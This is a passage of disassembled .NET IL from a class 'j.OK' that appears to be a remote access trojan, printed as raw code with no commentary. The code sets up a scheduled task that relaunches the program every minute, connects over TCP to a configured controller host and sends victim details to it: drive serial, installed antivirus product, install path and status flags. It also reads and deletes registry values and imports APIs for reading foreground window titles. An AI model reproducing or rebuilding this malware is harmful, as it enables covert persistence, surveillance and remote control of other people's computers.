      IL_0180:  newarr     [mscorlib]System.String
      IL_0185:  dup
      IL_0186:  ldc.i4.0
      IL_0187:  ldstr      "schtasks /create /sc minute /mo 1 /tn \""
      IL_018c:  stelem.ref
      IL_018d:  dup
      IL_018e:  ldc.i4.1
      IL_018f:  ldsfld     string j.OK::SCHEDNAME
      IL_0194:  stelem.ref
      IL_0195:  dup
      IL_0196:  ldc.i4.2
      IL_0197:  ldstr      "\" /tr "
      IL_019c:  stelem.ref
      IL_019d:  dup
      IL_019e:  ldc.i4.3
      IL_019f:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_01a4:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_01a9:  stelem.ref
      IL_01aa:  dup
      IL_01ab:  ldc.i4.4
      IL_01ac:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_01b1:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_01b6:  stelem.ref
      IL_01b7:  call       string [mscorlib]System.String::Concat(string[])
      IL_01bc:  ldc.i4.0
      IL_01bd:  ldc.i4.1
      IL_01be:  ldc.i4     0x1388
      IL_01c3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01c8:  pop
      IL_01c9:  leave.s    IL_01e6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01cb:  dup
      IL_01cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01d1:  stloc.s    V_4
      IL_01d3:  ldloc.s    V_4
      IL_01d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01da:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01df:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01e4:  leave.s    IL_01e6

    }  // end handler
    IL_01e6:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_01eb:  stloc.s    V_5
    IL_01ed:  ldloc.s    V_5
    IL_01ef:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_01f4:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_01f9:  brfalse.s  IL_0228

        .try
        {
          IL_01fb:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_0200:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_0205:  ldnull
          IL_0206:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_020b:  leave.s    IL_0228

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_020d:  dup
          IL_020e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0213:  stloc.s    V_6
          IL_0215:  ldloc.s    V_6
          IL_0217:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_021c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0221:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0226:  leave.s    IL_0228

        }  // end handler
        IL_0228:  nop
        .try
        {
          IL_0229:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
          IL_022e:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_0233:  leave.s    IL_0250

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0235:  dup
          IL_0236:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_023b:  stloc.s    V_7
          IL_023d:  ldloc.s    V_7
          IL_023f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0244:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0249:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_024e:  leave.s    IL_0250

        }  // end handler
        IL_0250:  leave.s    IL_026d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0252:  dup
        IL_0253:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0258:  stloc.s    V_8
        IL_025a:  ldloc.s    V_8
        IL_025c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0261:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0266:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_026b:  leave.s    IL_026d

      }  // end handler
      IL_026d:  nop
      .try
      {
        IL_026e:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0273:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
        IL_0278:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_027d:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0282:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0287:  ldc.i4     0x32000
        IL_028c:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_0291:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0296:  ldc.i4     0x32000
        IL_029b:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_02a0:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_02a5:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_02aa:  ldc.i4     0x2710
        IL_02af:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_02b4:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_02b9:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_02be:  ldc.i4     0x2710
        IL_02c3:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_02c8:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_02cd:  ldsfld     string j.OK::H
        IL_02d2:  ldsfld     string j.OK::P
        IL_02d7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_02dc:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_02e1:  ldc.i4.1
        IL_02e2:  stsfld     bool j.OK::Cn
        IL_02e7:  call       string j.OK::inf()
        IL_02ec:  call       bool j.OK::Send(string)
        IL_02f1:  pop
        .try
        {
          IL_02f2:  ldstr      "vn"
          IL_02f7:  ldstr      ""
          IL_02fc:  call       object j.OK::GTV(string,
                                                object)
          IL_0301:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_0306:  ldstr      ""
          IL_030b:  ldc.i4.0
          IL_030c:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_0311:  brfalse.s  IL_032d

          IL_0313:  ldloc.s    V_9
          IL_0315:  ldsflda    string j.OK::VN
          IL_031a:  call       string j.OK::DEB(string&)
          IL_031f:  ldstr      "\r\n"
          IL_0324:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0329:  stloc.s    V_9
          IL_032b:  br.s       IL_035d

          IL_032d:  ldloc.s    V_9
          IL_032f:  ldstr      "vn"
          IL_0334:  ldstr      ""
          IL_0339:  call       object j.OK::GTV(string,
                                                object)
          IL_033e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_0343:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_0348:  stloc.s    V_10
          IL_034a:  ldloca.s   V_10
          IL_034c:  call       string j.OK::DEB(string&)
          IL_0351:  ldstr      "\r\n"
          IL_0356:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_035b:  stloc.s    V_9
          IL_035d:  ldc.i4.s   16
          IL_035f:  newarr     [mscorlib]System.String
          IL_0364:  dup
          IL_0365:  ldc.i4.0
          IL_0366:  ldloc.s    V_9
          IL_0368:  stelem.ref
          IL_0369:  dup
          IL_036a:  ldc.i4.1
          IL_036b:  ldsfld     string j.OK::H
          IL_0370:  stelem.ref
          IL_0371:  dup
          IL_0372:  ldc.i4.2
          IL_0373:  ldstr      ":"
          IL_0378:  stelem.ref
          IL_0379:  dup
          IL_037a:  ldc.i4.3
          IL_037b:  ldsfld     string j.OK::P
          IL_0380:  stelem.ref
          IL_0381:  dup
          IL_0382:  ldc.i4.4
          IL_0383:  ldstr      "\r\n"
          IL_0388:  stelem.ref
          IL_0389:  dup
          IL_038a:  ldc.i4.5
          IL_038b:  ldsfld     string j.OK::DR
          IL_0390:  stelem.ref
          IL_0391:  dup
          IL_0392:  ldc.i4.6
          IL_0393:  ldstr      "\r\n"
          IL_0398:  stelem.ref
          IL_0399:  dup
          IL_039a:  ldc.i4.7
          IL_039b:  ldsfld     string j.OK::EXE
          IL_03a0:  stelem.ref
          IL_03a1:  dup
          IL_03a2:  ldc.i4.8
          IL_03a3:  ldstr      "\r\n"
          IL_03a8:  stelem.ref
          IL_03a9:  dup
          IL_03aa:  ldc.i4.s   9
          IL_03ac:  ldsfld     bool j.OK::Idr
          IL_03b1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_03b6:  stelem.ref
          IL_03b7:  dup
          IL_03b8:  ldc.i4.s   10
          IL_03ba:  ldstr      "\r\n"
          IL_03bf:  stelem.ref
          IL_03c0:  dup
          IL_03c1:  ldc.i4.s   11
          IL_03c3:  ldsfld     bool j.OK::IsF
          IL_03c8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_03cd:  stelem.ref
          IL_03ce:  dup
          IL_03cf:  ldc.i4.s   12
          IL_03d1:  ldstr      "\r\n"
          IL_03d6:  stelem.ref
          IL_03d7:  dup
          IL_03d8:  ldc.i4.s   13
          IL_03da:  ldsfld     bool j.OK::Isu
          IL_03df:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_03e4:  stelem.ref
          IL_03e5:  dup
          IL_03e6:  ldc.i4.s   14
          IL_03e8:  ldstr      "\r\n"
          IL_03ed:  stelem.ref
          IL_03ee:  dup
          IL_03ef:  ldc.i4.s   15
          IL_03f1:  ldsfld     bool j.OK::BD
          IL_03f6:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_03fb:  stelem.ref
          IL_03fc:  call       string [mscorlib]System.String::Concat(string[])
          IL_0401:  stloc.s    V_9
          IL_0403:  ldstr      "inf"
          IL_0408:  ldsfld     string j.OK::Y
          IL_040d:  ldloca.s   V_9
          IL_040f:  call       string j.OK::ENB(string&)
          IL_0414:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0419:  call       bool j.OK::Send(string)
          IL_041e:  pop
          IL_041f:  leave.s    IL_043c

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0421:  dup
          IL_0422:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0427:  stloc.s    V_11
          IL_0429:  ldloc.s    V_11
          IL_042b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0430:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0435:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_043a:  leave.s    IL_043c

        }  // end handler
        IL_043c:  leave.s    IL_0467

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_043e:  dup
        IL_043f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0444:  stloc.s    V_12
        IL_0446:  ldloc.s    V_12
        IL_0448:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_044d:  ldc.i4.0
        IL_044e:  stsfld     bool j.OK::Cn
        IL_0453:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0458:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_045d:  leave.s    IL_0467

      }  // end handler
    }  // end .try
    finally
    {
      IL_045f:  ldloc.s    V_5
      IL_0461:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_0466:  endfinally
    }  // end handler
    IL_0467:  ldsfld     bool j.OK::Cn
    IL_046c:  ret
  } // end of method OK::connect

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (uint8[] V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldind.ref
    IL_0002:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0007:  stloc.0
    IL_0008:  ldloca.s   V_0
    IL_000a:  call       string j.OK::BS(uint8[]&)
    IL_000f:  ret
  } // end of method OK::DEB

  .method public static void  DLV(string n) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  ldc.i4.1
      IL_001f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0024:  ldarg.0
      IL_0025:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002a:  leave.s    IL_0045

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.0
      IL_0033:  ldloc.0
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0039:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0043:  leave.s    IL_0045

    }  // end handler
    IL_0045:  ret
  } // end of method OK::DLV

  .method public static void  ED() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  call       void j.OK::pr(int32)
    IL_0006:  ret
  } // end of method OK::ED

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       uint8[] j.OK::SB(string&)
    IL_0006:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000b:  ret
  } // end of method OK::ENB

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static string  GetAntiVirus() cil managed
  {
    // Code size       326 (0x146)
    .maxstack  7
    .locals init (string V_0,
             int32 V_1,
             int32 V_2,
             int32 V_3,
             object V_4,
             object V_5,
             object[] V_6,
             bool[] V_7,
             object V_8,
             class [mscorlib]System.Collections.IEnumerator V_9,
             object V_10,
             int32 V_11,
             class [mscorlib]System.Exception V_12)
    .try
    {
      IL_0000:  ldc.i4.1
      IL_0001:  stloc.3
      IL_0002:  ldstr      "Select * From AntiVirusProduct"
      IL_0007:  stloc.s    V_4
      IL_0009:  ldc.i4.2
      IL_000a:  stloc.3
      IL_000b:  ldstr      "winmgmts:\\\\.\\root\\SecurityCenter2"
      IL_0010:  ldnull
      IL_0011:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::GetObject(string,
                                                                                                      string)
      IL_0016:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_001b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0020:  stloc.s    V_5
      IL_0022:  ldc.i4.3
      IL_0023:  stloc.3
      IL_0024:  ldc.i4.1
      IL_0025:  newarr     [mscorlib]System.Object
      IL_002a:  dup
      IL_002b:  ldc.i4.0
      IL_002c:  ldloc.s    V_4
      IL_002e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0033:  stelem.ref
      IL_0034:  stloc.s    V_6
      IL_0036:  ldc.i4.1
      IL_0037:  newarr     [mscorlib]System.Boolean
      IL_003c:  dup
      IL_003d:  ldc.i4.0
      IL_003e:  ldc.i4.1
      IL_003f:  stelem.i1
      IL_0040:  stloc.s    V_7
      IL_0042:  ldloc.s    V_7
      IL_0044:  ldc.i4.0
      IL_0045:  ldelem.u1
      IL_0046:  brfalse.s  IL_0058

      IL_0048:  ldloc.s    V_6
      IL_004a:  ldc.i4.0
      IL_004b:  ldelem.ref
      IL_004c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0051:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0056:  stloc.s    V_4
      IL_0058:  ldloc.s    V_5
      IL_005a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_005f:  ldnull
      IL_0060:  ldstr      "ExecQuery"
      IL_0065:  ldloc.s    V_6
      IL_0067:  ldnull
      IL_0068:  ldnull
      IL_0069:  ldloc.s    V_7
      IL_006b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0070:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0075:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_007a:  stloc.s    V_8
      IL_007c:  ldc.i4.4
      IL_007d:  stloc.3
      IL_007e:  ldloc.s    V_8
      IL_0080:  castclass  [mscorlib]System.Collections.IEnumerable
      IL_0085:  callvirt   instance class [mscorlib]System.Collections.IEnumerator [mscorlib]System.Collections.IEnumerable::GetEnumerator()
      IL_008a:  stloc.s    V_9
      IL_008c:  br.s       IL_00ca

      IL_008e:  ldloc.s    V_9
      IL_0090:  callvirt   instance object [mscorlib]System.Collections.IEnumerator::get_Current()
      IL_0095:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_009a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_009f:  stloc.s    V_10
      IL_00a1:  ldc.i4.1
      IL_00a2:  stloc.2
      IL_00a3:  ldc.i4.6
      IL_00a4:  stloc.3
      IL_00a5:  ldloc.s    V_10
      IL_00a7:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00ac:  ldnull
      IL_00ad:  ldstr      "displayName"
      IL_00b2:  ldc.i4.0
      IL_00b3:  newarr     [mscorlib]System.Object
      IL_00b8:  ldnull
      IL_00b9:  ldnull
      IL_00ba:  ldnull
      IL_00bb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_00c0:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_00c5:  stloc.0
      IL_00c6:  leave.s    IL_0142

      IL_00c8:  ldc.i4.7
      IL_00c9:  stloc.3
      IL_00ca:  ldloc.s    V_9
      IL_00cc:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_00d1:  brtrue.s   IL_008e

      IL_00d3:  ldloc.s    V_9
      IL_00d5:  isinst     [mscorlib]System.IDisposable
      IL_00da:  brfalse.s  IL_00e8

      IL_00dc:  ldloc.s    V_9
      IL_00de:  isinst     [mscorlib]System.IDisposable
      IL_00e3:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_00e8:  ldc.i4.8
      IL_00e9:  stloc.3
      IL_00ea:  ldstr      "No AV"
      IL_00ef:  stloc.0
      IL_00f0:  leave.s    IL_0142

      IL_00f2:  ldc.i4.0
      IL_00f3:  stloc.1
      IL_00f4:  ldloc.1
      IL_00f5:  ldc.i4.1
      IL_00f6:  add.ovf
      IL_00f7:  stloc.s    V_11
      IL_00f9:  ldloc.s    V_11
      IL_00fb:  ldc.i4.1
      IL_00fc:  sub
      IL_00fd:  switch     ( 
                            IL_0000,
                            IL_0009,
                            IL_0022,
                            IL_007c,
                            IL_00a1,
                            IL_00a3,
                            IL_00c8,
                            IL_00e8,
                            IL_0126)
      IL_0126:  leave.s    IL_0142

      IL_0128:  ldloc.3
      IL_0129:  stloc.1
      IL_012a:  ldloc.2
      IL_012b:  brfalse.s  IL_0131

      IL_012d:  ldloc.2
      IL_012e:  ldc.i4.1
      IL_012f:  beq.s      IL_00f2

      IL_0131:  leave.s    IL_0142

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0133:  dup
      IL_0134:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0139:  stloc.s    V_12
      IL_013b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0140:  leave.s    IL_0128

    }  // end handler
    IL_0142:  ldloc.1
    IL_0143:  pop
    IL_0144:  ldloc.0
    IL_0145:  ret
  } // end of method OK::GetAntiVirus

  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static object  GTV(string n,
                                    object 'ret') cil managed
  {
    // Code size       94 (0x5e)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_0034:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0039:  stloc.0
      IL_003a:  leave.s    IL_005c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003c:  dup
      IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0042:  stloc.1
      IL_0043:  ldloc.1
      IL_0044:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0049:  ldarg.1
      IL_004a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_004f:  stloc.0
      IL_0050:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0055:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005a:  leave.s    IL_005c

    }  // end handler
    IL_005c:  ldloc.0
    IL_005d:  ret
  } // end of method OK::GTV

  .method public static string  HWD() cil managed
  {
    // Code size       96 (0x60)
    .maxstack  8
    .locals init (string V_0,
             int32 V_1,
             string V_2,
             int32 V_3,
             int32 V_4,
             string V_5,
             string V_6,
             class [mscorlib]System.Exception V_7)
    .try
    {
      IL_0000:  ldnull
      IL_0001:  stloc.2
      IL_0002:  ldc.i4.0
      IL_0003:  stloc.3
      IL_0004:  ldc.i4.0
      IL_0005:  stloc.s    V_4
      IL_0007:  ldnull
      IL_0008:  stloc.s    V_5
      IL_000a:  ldstr      "SystemDrive"
      IL_000f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0014:  ldstr      "\\"
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  stloc.s    V_6
      IL_0020:  ldloca.s   V_6
      IL_0022:  ldloca.s   V_2
      IL_0024:  ldc.i4.0
      IL_0025:  ldloca.s   V_1
      IL_0027:  ldloca.s   V_3
      IL_0029:  ldloca.s   V_4
      IL_002b:  ldloca.s   V_5
      IL_002d:  ldc.i4.0
      IL_002e:  call       int32 j.OK::GetVolumeInformation(string&,
                                                            string&,
                                                            int32,
                                                            int32&,
                                                            int32&,
                                                            int32&,
                                                            string&,
                                                            int32)
      IL_0033:  pop
      IL_0034:  ldloc.1
      IL_0035:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003a:  stloc.0
      IL_003b:  leave.s    IL_005e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003d:  dup
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  stloc.s    V_7
      IL_0045:  ldloc.s    V_7
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  ldstr      "ERR"
      IL_0051:  stloc.0
      IL_0052:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005c:  leave.s    IL_005e

    }  // end handler
    IL_005e:  ldloc.0
    IL_005f:  ret
  } // end of method OK::HWD

  .method public static pinvokeimpl("KERNEL32.DLL" winapi) 
          void  Beep(int32 freq,
                     int32 dur) cil managed preservesig
  {
  }
